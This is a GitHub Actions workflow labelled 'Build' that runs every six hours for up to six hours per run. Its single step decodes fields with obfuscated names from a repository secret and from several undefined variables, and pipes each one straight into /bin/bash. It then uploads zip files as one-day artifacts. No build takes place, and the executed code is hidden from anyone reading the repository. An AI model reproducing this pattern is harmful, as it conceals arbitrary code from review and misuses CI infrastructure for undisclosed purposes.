name: Build
on:
  workflow_dispatch:

  schedule:
    - cron: '57 3,9,15,21 * * *'
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
jobs:
  run:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Build and run
        env:
          yqsus183: ${{ secrets.yqsus183 }}
        run: |
          printf '%s' "$yqsus183" | jq -r .b4828 | /bin/bash
          echo $y1 | jq -r .rv79231 | /bin/bash
          printf '%s' "$fevs75" | jq -r .ftw91284 | /bin/bash
          printf '%s' "$x7" | jq -r .i89 | /bin/bash
          printf '%s' "$u46" | jq -r .ld026 | /bin/bash

      - name: Save output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: W7nizNJd
          path: "*.zip"
          retention-days: 1
